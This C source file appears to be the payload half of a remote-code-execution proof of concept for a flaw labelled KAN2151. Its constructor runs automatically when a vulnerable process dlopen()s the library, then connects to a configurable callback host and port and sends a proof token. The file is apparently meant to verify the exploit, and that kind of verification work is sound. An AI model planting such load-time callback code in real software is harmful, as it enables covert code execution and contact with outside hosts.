#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 33333
#endif

#ifndef CALLBACK_TOKEN
#define CALLBACK_TOKEN "UNSET"
#endif

/*
 * Minimal, non-shell RCE proof.  dlopen invokes this constructor inside the
 * vulnerable process.  A per-run token prevents an old or unrelated network
 * connection from being counted as exploit success.
 */
__attribute__((constructor))
static void callback(void) {
  static const char proof[] =
      "KAN2151_RCE_CALLBACK " CALLBACK_TOKEN "\n";
  struct sockaddr_in address;
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    return;
  }
  memset(&address, 0, sizeof(address));
  address.sin_family = AF_INET;
  address.sin_port = htons(CALLBACK_PORT);
  if (inet_pton(AF_INET, CALLBACK_HOST, &address.sin_addr) != 1) {
    close(fd);
    return;
  }
  if (connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0) {
    ssize_t written = write(fd, proof, sizeof(proof) - 1);
    (void)written;
  }
  (void)close(fd);
}
